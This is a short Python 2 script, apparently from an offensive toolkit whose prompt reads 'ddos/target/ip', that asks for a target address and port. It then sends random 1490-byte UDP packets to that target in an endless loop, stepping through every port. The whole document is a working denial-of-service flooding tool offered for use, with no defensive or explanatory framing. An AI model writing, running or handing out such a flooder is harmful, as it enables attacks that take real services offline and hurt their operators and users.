import sys
import os
import time
import socket
import random

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

ip = raw_input("\033[4mpsf\033[0m set(\033[91mddos/target/ip\033[0m) > ")
port = input("\033[4mpsf\033[0m set(\033[91mddos/target/port\033[0m) > ")
print

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
